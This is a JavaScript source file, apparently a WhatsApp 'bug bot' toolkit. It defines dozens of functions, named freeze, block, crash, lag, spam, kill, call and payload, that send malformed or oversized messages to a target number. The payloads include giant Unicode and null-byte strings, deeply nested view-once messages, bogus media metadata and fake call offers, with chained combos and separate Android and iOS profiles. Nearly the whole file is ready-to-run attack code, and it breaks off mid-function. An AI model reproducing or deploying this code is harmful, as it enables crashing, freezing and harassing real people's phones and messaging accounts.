async function and_frz3(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    pollCreationMessage: {
      name: 'ꦾ'.repeat(o.payloadSize),
      options: Array.from({ length: o.pollOptions }, (_, j) => ({
        optionName: 'ꦾ'.repeat(5000) + j
      })),
      selectableOptionsCount: o.pollOptions
    }
  }, {}).catch(() => {});
}

async function and_frz4(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: 'ꦾ'.repeat(o.payloadSize),
          contextInfo: {
            mentionedJid: Array.from({ length: o.mentionCount }, () =>
              Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
          }
        }
      }
    }
  }, {}).catch(() => {});
}

async function and_frz5(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(o.payloadSize),
        contextInfo: {
          quotedMessage: { conversation: 'ꦾ'.repeat(o.payloadSize) },
          forwardingScore: 9999, isForwarded: true
        }
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_blk1(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    conversation: '\u0000'.repeat(o.payloadSize)
  }, {}).catch(() => {});
}

async function and_blk2(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    conversation: '\u200B'.repeat(o.payloadSize)
  }, {}).catch(() => {});
}

async function and_blk3(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: '\u0000'.repeat(o.payloadSize),
      matchedText: '\u0000',
      description: '\u0000'.repeat(o.payloadSize),
      title: '\u0000'.repeat(o.payloadSize)
    }
  }, {}).catch(() => {});
}

async function and_blk4(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/n.enc',
      mimetype: 'image/jpeg',
      fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileLength: '0', height: 0, width: 0,
      mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      directPath: '/n.enc',
      caption: '\u0000'.repeat(o.payloadSize)
    }
  }, {}).catch(() => {});
}

async function and_blk5(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    documentMessage: {
      url: 'https://mmg.whatsapp.net/n.enc',
      mimetype: 'application/pdf',
      fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileLength: '0', pageCount: 0,
      mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileName: '\u0000'.repeat(o.payloadSize),
      fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      directPath: '/n.enc'
    }
  }, {}).catch(() => {});
}

async function and_crs1(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + '\u0000'.repeat(500) }
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_crs2(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 999999999999,
      requestFrom: target,
      noteMessage: { extendedTextMessage: { text: '\u0000'.repeat(o.payloadSize) } },
      expiryTimestamp: 99999999999999,
      amount: { offset: 0, value: 999999999, currencyCode: 'IDR' }
    }
  }, {}).catch(() => {});
}

async function and_crs3(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: 'and_' + Date.now(),
      name: 'ꦾ'.repeat(Math.min(o.payloadSize, 65000)),
      publisher: 'ꦾ'.repeat(Math.min(o.payloadSize, 65000)),
      stickers: [], fileLength: '999999999',
      fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
      fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
      mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
      directPath: '/and.enc',
      mediaKeyTimestamp: Date.now().toString()
    }
  }, {}).catch(() => {});
}

async function and_crs4(sock, target, opts = {}) {
  await sock.relayMessage(target, {
    albumMessage: { expectedImageCount: 99999999, expectedVideoCount: 99999999 }
  }, {}).catch(() => {});
}

async function and_crs5(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        viewOnceMessage: {
          message: {
            viewOnceMessage: {
              message: { extendedTextMessage: { text: '\u0000'.repeat(o.payloadSize) } }
            }
          }
        }
      }
    }
  }, {}).catch(() => {});
}

async function and_lag1(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(o.payloadSize),
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_lag2(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, { conversation: 'ꦾ'.repeat(o.payloadSize) }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_lag3(sock, target, opts = {}) {
  const o = andProfile(opts);
  const now = Date.now();
  for (let i = 0; i < o.loop; i++) {
    const backMs = Math.floor(Math.random() * o.fakeTimestampMaxDays * 86400000);
    const fakeTs = now - backMs;
    const msg = generateWAMessageFromContent(target, {
      extendedTextMessage: { text: 'ꦾ'.repeat(o.payloadSize) + ' #' + i }
    }, { timestamp: new Date(fakeTs) });
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, timestamp: fakeTs }).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_lag4(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      audioMessage: {
        url: 'https://mmg.whatsapp.net/w.enc',
        mimetype: 'audio/ogg; codecs=opus',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileLength: '9999999', seconds: 9999, ptt: true,
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        directPath: '/w.enc',
        waveform: Buffer.alloc(o.waveformKB * 1024, 0x80)
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_lag5(sock, target, opts = {}) {
  const o = andProfile(opts);
  const steps = 20;
  const stepSize = Math.floor(o.payloadSize / steps);
  for (let i = 1; i <= steps; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: { text: 'ꦾ'.repeat(stepSize * i) }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_spm1(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.relayMessage(target, {
      reactionMessage: {
        key: { remoteJid: target, fromMe: false, id: '3EB0' + crypto.randomBytes(8).toString('hex') },
        text: '😂'
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

async function and_spm2(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: -6.2 + Math.random(),
        degreesLongitude: 106.8 + Math.random(),
        name: 'ꦾ'.repeat(Math.min(o.payloadSize, 20000))
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_spm3(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      contactMessage: {
        displayName: 'ꦾ'.repeat(Math.min(o.payloadSize, 20000)),
        vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + 'ꦾ'.repeat(Math.min(o.payloadSize, 20000)) + '\nEND:VCARD'
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_spm4(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/s.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 512, width: 512,
        directPath: '/s.enc', fileLength: 999999
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_spm5(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      pollCreationMessage: {
        name: 'ꦾ'.repeat(Math.min(o.payloadSize, 20000)) + ' #' + i,
        options: Array.from({ length: 5 }, (_, j) => ({ optionName: 'ꦾ'.repeat(3000) + j })),
        selectableOptionsCount: 1
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_kil1(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'net', attrs: { medium: '0' } }
      ]
    }]
  }).catch(() => {});
}

async function and_kil2(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sleep(50);
    await sock.sendPresenceUpdate('paused', target).catch(() => {});
    await sleep(50);
  }
}

async function and_kil3(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.readMessages([{
      remoteJid: target,
      id: '3EB0' + crypto.randomBytes(8).toString('hex'),
      participant: target
    }]).catch(() => {});
    await sleep(50);
  }
}

async function and_kil4(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.updateBlockStatus(target, 'block').catch(() => {});
    await sleep(50);
    await sock.updateBlockStatus(target, 'unblock').catch(() => {});
    await sleep(50);
  }
}

async function and_kil5(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.chatModify({
      clear: true,
      lastMessages: [{
        key: { remoteJid: target, fromMe: true, id: '3EB0' + i },
        messageTimestamp: Math.floor(Date.now() / 1000)
      }]
    }, target).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_car1(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(Math.min(o.payloadSize, 30000)) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, () => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(3000) },
          body: { text: 'ꦾ'.repeat(5000) }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_car2(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(2000) },
          nativeFlowMessage: {
            buttons: [{ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(2000), id: 'c_' + i }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_car3(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          nativeFlowMessage: {
            buttons: [{ name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(2000), url: 'https://x.com/' + 'ꦾ'.repeat(2000) + i }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_car4(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          nativeFlowMessage: {
            buttons: [{ name: 'payment_info', buttonParamsJson: JSON.stringify({ reference_id: 'c_' + i, amount: 999999999, currency: 'IDR' }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_car5(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(2000) },
          nativeFlowMessage: {
            buttons: [
              { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(1000), id: 'm_' + i }) },
              { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(1000), url: 'https://x.com/' + i }) },
              { name: 'cta_copy', buttonParamsJson: JSON.stringify({ copy_code: 'ꦾ'.repeat(1000) }) }
            ]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_stk1(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/an.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 9999, width: 9999,
        directPath: '/an.enc', fileLength: 999999999,
        isAnimated: true, firstFrameLength: 19904,
        firstFrameSidecar: 'KN4kQ5pyABRAgA=='
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_stk2(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/lo.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'application/was', height: 512, width: 512,
        directPath: '/lo.enc', fileLength: 999999999, isLottie: true
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_stk3(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < Math.min(o.loop, 5); i++) {
    await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: 'stk_' + Date.now() + '_' + i,
        name: 'ꦾ'.repeat(50000), publisher: 'ꦾ'.repeat(50000),
        stickers: [], fileLength: '999999999',
        fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
        fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
        mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
        directPath: '/stk.enc', mediaKeyTimestamp: Date.now().toString()
      }
    }, {}).catch(() => {});
    await sleep(500);
  }
}

async function and_stk4(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/inv.enc',
        fileSha256: '\u0000'.repeat(50),
        fileEncSha256: '\u0000'.repeat(50),
        mediaKey: '\u0000'.repeat(50),
        mimetype: 'image/webp', height: 512, width: 512,
        directPath: '/inv.enc', fileLength: 999999999
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_stk5(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/z.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 0, width: 0,
        directPath: '/z.enc', fileLength: 0
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_cal1(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'net', attrs: { medium: '3' } }
      ]
    }]
  }).catch(() => {});
}

async function and_cal2(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: Array.from({ length: 100 }, () => ({ tag: 'audio', attrs: { enc: 'opus', rate: '8000' } }))
    }]
  }).catch(() => {});
}

async function and_cal3(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'capability', attrs: { ver: '99' }, content: Buffer.alloc(100000, 0xFF) }
      ]
    }]
  }).catch(() => {});
}

async function and_cal4(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < Math.min(o.loop, 10); i++) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
    await sock.query({
      tag: 'call',
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: 'offer',
        attrs: { 'call-id': callId, 'call-creator': sock.user.id },
        content: [
          { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
          { tag: 'net', attrs: { medium: '3' } }
        ]
      }]
    }).catch(() => {});
    await sleep(1000);
  }
}

async function and_cal5(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'terminate',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id, reason: 'timeout' },
      content: []
    }]
  }).catch(() => {});
}

async function and_pld1(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, { conversation: 'ꦾ'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function and_pld2(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(o.payloadSize),
      matchedText: 'ꦾ'.repeat(o.payloadSize),
      description: 'ꦾ'.repeat(o.payloadSize),
      title: 'ꦾ'.repeat(o.payloadSize)
    }
  }, {}).catch(() => {});
}

async function and_pld3(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, { conversation: '\u0000'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function and_pld4(sock, target, opts = {}) {
  const o = andProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(30000),
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function and_pld5(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    conversation: '☠️'.repeat(Math.min(o.payloadSize, 100000))
  }, {}).catch(() => {});
}

async function and_chn1(sock, target, opts = {}) {
  await and_frz1(sock, target, { ...opts, loop: 5 });
  await sleep(800);
  await and_lag1(sock, target, { ...opts, mentionCount: 5000 });
  await sleep(800);
  await and_kil1(sock, target, opts);
}

async function and_chn2(sock, target, opts = {}) {
  await and_blk1(sock, target, opts);
  await sleep(500);
  await and_spm1(sock, target, { ...opts, loop: 5 });
  await sleep(500);
  await and_crs1(sock, target, opts);
}

async function and_chn3(sock, target, opts = {}) {
  await and_car1(sock, target, opts);
  await sleep(800);
  await and_stk3(sock, target, { ...opts, loop: 3 });
  await sleep(800);
  await and_cal3(sock, target, opts);
}

async function and_chn4(sock, target, opts = {}) {
  await and_lag3(sock, target, { ...opts, loop: 20 });
  await sleep(500);
  await and_lag4(sock, target, { ...opts, loop: 10 });
}

async function and_chn5(sock, target, opts = {}) {
  await and_frz1(sock, target, { ...opts, loop: 3 });
  await sleep(500);
  await and_blk1(sock, target, opts);
  await sleep(500);
  await and_crs2(sock, target, opts);
  await sleep(500);
  await and_kil1(sock, target, opts);
}

console.log('[🐛 ANDROID] 60 bug Android loaded');

// ══════════════════════════════════════════════════════════════
// IOS 60 BUG — PLATFORM-AWARE
// ══════════════════════════════════════════════════════════════

const IOS_PROFILE = {
  maxPayload: 200000, maxMention: 5000, nullByteOK: false,
  viewOnceNested: true, fakeTimestampMaxDays: 7,
  carouselMaxCards: 50, waveformMaxKB: 100, buttonMax: 500, pollMax: 50
};

function iosClamp(v, min, max) { return v < min ? min : (v > max ? max : v); }

function iosProfile(opts = {}) {
  const p = IOS_PROFILE;
  return {
    ...opts,
    payloadSize: iosClamp(opts.payloadSize || 50000, 1000, p.maxPayload),
    mentionCount: iosClamp(opts.mentionCount || 1000, 0, p.maxMention),
    loop: iosClamp(opts.loop || 10, 1, 50),
    delay: iosClamp(opts.delay || 500, 100, 5000),
    waveformKB: iosClamp(opts.waveformKB || 50, 1, p.waveformMaxKB),
    cardCount: iosClamp(opts.cardCount || 20, 1, p.carouselMaxCards),
    buttonCount: iosClamp(opts.buttonCount || 50, 1, p.buttonMax),
    pollOptions: iosClamp(opts.pollOptions || 10, 2, p.pollMax),
    fakeTimestampMaxDays: p.fakeTimestampMaxDays
  };
}

async function ios_frz1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(o.payloadSize) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, () => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(2000) },
          body: { text: 'ꦾ'.repeat(3000) }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_frz2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        viewOnceMessage: {
          message: {
            extendedTextMessage: { text: 'ꦾ'.repeat(o.payloadSize) }
          }
        }
      }
    }
  }, {}).catch(() => {});
}

async function ios_frz3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(o.payloadSize),
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_frz4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    audioMessage: {
      url: 'https://mmg.whatsapp.net/i.enc',
      mimetype: 'audio/ogg; codecs=opus',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileLength: '9999999', seconds: 9999, ptt: true,
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      directPath: '/i.enc',
      waveform: Buffer.alloc(o.waveformKB * 1024, 0x80)
    }
  }, {}).catch(() => {});
}

async function ios_frz5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    buttonsMessage: {
      contentText: 'ꦾ'.repeat(o.payloadSize),
      footerText: 'ꦾ'.repeat(o.payloadSize),
      headerType: 1,
      buttons: Array.from({ length: o.buttonCount }, (_, j) => ({
        buttonId: 'b_' + j,
        buttonText: { displayText: 'ꦾ'.repeat(2000) },
        type: 1
      }))
    }
  }, {}).catch(() => {});
}

async function ios_blk1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, { conversation: '\u200B'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function ios_blk2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, { conversation: '\uFEFF'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function ios_blk3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, { conversation: '\u202E'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function ios_blk4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/n.enc',
      mimetype: 'image/jpeg',
      fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileLength: '0', height: 0, width: 0,
      mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      directPath: '/n.enc',
      caption: '\u200B'.repeat(o.payloadSize)
    }
  }, {}).catch(() => {});
}

async function ios_blk5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    documentMessage: {
      url: 'https://mmg.whatsapp.net/n.enc',
      mimetype: 'application/pdf',
      fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileLength: '0', pageCount: 0,
      mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      fileName: '\u200B'.repeat(Math.min(o.payloadSize, 50000)),
      fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
      directPath: '/n.enc'
    }
  }, {}).catch(() => {});
}

async function ios_crs1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        viewOnceMessage: {
          message: {
            viewOnceMessage: {
              message: {
                viewOnceMessage: {
                  message: {
                    viewOnceMessage: {
                      message: { extendedTextMessage: { text: '\u200B'.repeat(o.payloadSize) } }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {}).catch(() => {});
}

async function ios_crs2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + '\u200B'.repeat(200) }
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_crs3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 999999999999,
      requestFrom: target,
      noteMessage: { extendedTextMessage: { text: '\u200B'.repeat(o.payloadSize) } },
      expiryTimestamp: 99999999999999,
      amount: { offset: 0, value: 999999999, currencyCode: 'IDR' }
    }
  }, {}).catch(() => {});
}

async function ios_crs4(sock, target, opts = {}) {
  await sock.relayMessage(target, {
